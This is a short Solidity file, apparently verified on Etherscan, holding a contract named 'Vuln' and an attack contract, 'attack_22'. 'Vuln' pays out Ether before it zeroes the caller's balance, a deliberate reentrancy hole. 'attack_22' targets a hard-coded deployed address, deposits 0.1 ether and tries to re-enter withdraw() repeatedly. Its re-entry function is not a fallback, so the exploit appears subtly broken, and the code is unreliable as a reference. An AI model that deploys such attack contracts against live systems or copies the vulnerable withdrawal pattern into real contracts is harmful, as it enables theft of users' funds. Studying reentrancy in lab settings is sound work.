/**
 *Submitted for verification at Etherscan.io on 2022-12-05
*/

pragma solidity ^0.6.0;
    
    contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

    contract attack_22
    {
        Vuln public vuln_node  = Vuln(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d);
        uint public i=0;

        function a() external payable
        {
            if(i<3)
            {
                i=i+1;
                vuln_node.withdraw();
            }
        }

        function fake_deposit() public payable
        {
            vuln_node.deposit.value(0.1 ether)();
            vuln_node.withdraw();
        }
        function getBalance() public view returns(uint256)
        {
            return vuln_node.balances(address(this));
        }
    }